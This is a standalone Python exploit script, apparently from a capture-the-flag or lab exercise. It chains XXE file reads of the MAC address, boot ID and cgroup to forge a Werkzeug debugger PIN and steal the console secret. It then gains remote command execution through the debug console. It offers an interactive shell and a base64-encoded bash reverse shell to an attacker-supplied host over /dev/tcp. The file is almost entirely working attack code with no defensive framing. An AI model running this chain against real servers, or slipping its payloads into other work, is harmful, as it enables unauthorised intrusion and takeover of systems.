import hashlib
from itertools import chain
import requests,json
from urllib.parse import quote,unquote
from bs4 import BeautifulSoup
import sys,base64

def getmac(ip,port):
    burp0_url = f"http://{ip}:{port}/search"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": f"http://{ip}:{port}/?fbclid=IwAR2xOss3gWl4HCt-JPZeQANR7-BiowNm5bYCuoBg5GXM71FfyMtxhTtAb2Y", "Content-Type": "text/plain;charset=UTF-8", "Origin": f"http://{ip}:{port}", "Connection": "close", "X-PwnFox-Color": "green"}
    burp0_data = "<!DOCTYPE d [\r\n   <!ENTITY e SYSTEM \"/sys/class/net/eth0/address\" >]>\r\n   <username>&e;</username>\r\n"
    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    macaddress = res.text
    macaddress = macaddress.replace("<username>", "").replace("</username>", "").replace(":", "")
    macaddress = 0x0000000000000000 + int(macaddress, 16)
    return macaddress

def getID(ip,port):
    burp0_url = f"http://{ip}:{port}/search"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": f"http://{ip}:{port}/?fbclid=IwAR2xOss3gWl4HCt-JPZeQANR7-BiowNm5bYCuoBg5GXM71FfyMtxhTtAb2Y", "Content-Type": "text/plain;charset=UTF-8", "Origin": f"http://{ip}:{port}", "Connection": "close", "X-PwnFox-Color": "green"}
    burp0_data = "<!DOCTYPE d [\r\n   <!ENTITY e SYSTEM \"/proc/sys/kernel/random/boot_id\" >]>\r\n   <username>&e;</username>\r\n"
    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    bootID = res.text
    bootID = bootID.replace("<username>", "").replace("</username>", "").replace("\n", "")
    return bootID

def getCgroup(ip,port):
    burp0_url = f"http://{ip}:{port}/search"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": f"http://{ip}:{port}/?fbclid=IwAR2xOss3gWl4HCt-JPZeQANR7-BiowNm5bYCuoBg5GXM71FfyMtxhTtAb2Y", "Content-Type": "text/plain;charset=UTF-8", "Origin": f"http://{ip}:{port}", "Connection": "close", "X-PwnFox-Color": "green"}
    burp0_data = "<!DOCTYPE d [\r\n   <!ENTITY e SYSTEM \"/proc/self/cgroup\" >]>\r\n   <username>&e;</username>\r\n"
    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    cgroup = res.text
    cgroup = cgroup.replace("<username>", "").replace("</username>", "")
    cgroup = cgroup.split("\n")[0]
    cgroup = cgroup.split("/")[2]
    return cgroup

def genPIN():
    probably_public_bits = [
        'werkzeug', #username
        'django.contrib.staticfiles.handlers', # modname
        'StaticFilesHandler', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.11/site-packages/django/contrib/staticfiles/handlers.py' # getattr(mod, '__file__', None),
    ]

    private_bits = [
        f'{getmac(ip,port)}', #str(uuid.getnode()), /proc/net/arp /sys/class/net/eth0/address
        f'{getID(ip,port)+getCgroup(ip,port)}' #get_machine_id(), /proc/sys/kernel/random/boot_id /proc/self/cgroup
    ]
    # print(f'Private bits:\n Mac: {private_bits[0]}\n Machine ID: {private_bits[1]}')

    #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    #h.update(b'shittysalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(f'PIN: {rv}')
    return rv

def getCookies(ip,port):
    burp0_url = f"http://{ip}:{port}/console"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "X-PwnFox-Color": "green"}
    res = requests.get(burp0_url, headers=burp0_headers)
    html = BeautifulSoup(res.text, 'html.parser')
    scripttag = html.findAll('script')
    for i in scripttag:
        if 'SECRET' in str(i) and str(i)!=None:
            secretKey = str(i).split('SECRET = "')[1].split('";')[0]

    burp0_url = f"http://{ip}:{port}/console?__debugger__=yes&cmd=pinauth&pin={genPIN()}&s={secretKey}"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": f"http://{ip}:{port}/console", "Connection": "close", "X-PwnFox-Color": "green"}
    res = requests.get(burp0_url, headers=burp0_headers)
    cookies={}
    if res.json().get('auth') == True:
        cookie = res.headers['Set-Cookie'].split(';')[0]
        key = cookie.split('=')[0]
        value = cookie.split('=')[1]
        cookies = {key:value}
    else:
        print("Error")
    return cookies,secretKey

def getShell(ip, port):
    while True:
        cookie, secret = getCookies(ip,port) 
        cmd = input("cmd: ")
        full_cmd = f'''a=__import__('os').popen('{cmd}').read(); print(a);'''
        if cmd == 'exit':
            break
        full_cmd = quote(full_cmd)
        burp0_url = f'http://{ip}:{port}/console?__debugger__=yes&cmd={full_cmd}&s={secret}&frm=0'
        burp0_cookies = cookie
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": f"http://{ip}:{port}/console", "Connection": "close", "X-PwnFox-Color": "green"}
        res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        html = BeautifulSoup(res.text, 'html.parser')
        data = html.text
        print(data)

def getRevShell(ip, port, your_ip, netcat_port):
    cookie, secret = getCookies(ip,port) 
    cmd = f'''/bin/bash -i >& /dev/tcp/{your_ip}/{netcat_port} 0>&1'''
    cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
    revcmd = 'echo '+ str(cmd) +'|base64 -d|bash'
    full_cmd = f'''a=__import__('os').popen('{revcmd}').read(); print(a);'''
    print(full_cmd)
    full_cmd = quote(full_cmd)
    burp0_url = f'http://{ip}:{port}/console?__debugger__=yes&cmd={full_cmd}&s={secret}&frm=0'
    burp0_cookies = cookie
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": f"http://{ip}:{port}/console", "Connection": "close", "X-PwnFox-Color": "green"}
    try:
        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, timeout=5)
    except:
        print("Rev shell sent successfully")
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) == 3:
        print("USAGE: python3 %s <ip> <port> to use shell" % (sys.argv[0]))
        ip = sys.argv[1]
        port = sys.argv[2]
        response = requests.get(f'http://{sys.argv[1]}:{sys.argv[2]}/console')

        if "Werkzeug " not in response.text:
            print("[-] Debug is not enabled")
            sys.exit(-1)
        
        getShell(ip,port)
    if len(sys.argv) == 5:
        ip = sys.argv[1]
        port = sys.argv[2]
        your_ip = sys.argv[3]
        netcat_port = sys.argv[4]
        response = requests.get(f'http://{sys.argv[1]}:{sys.argv[2]}/console')
        if "Werkzeug " not in response.text:
            print("[-] Debug is not enabled")
            sys.exit(-1)
        
        getRevShell(ip,port,your_ip,netcat_port)
    else:
        print("USAGE: python3 %s <ip> <port> to use shell" % (sys.argv[0]))
        print("USAGE: python3 %s <ip> <port> <your ip> <netcat port> to use revshell" % (sys.argv[0]))
        sys.exit(1)
    
    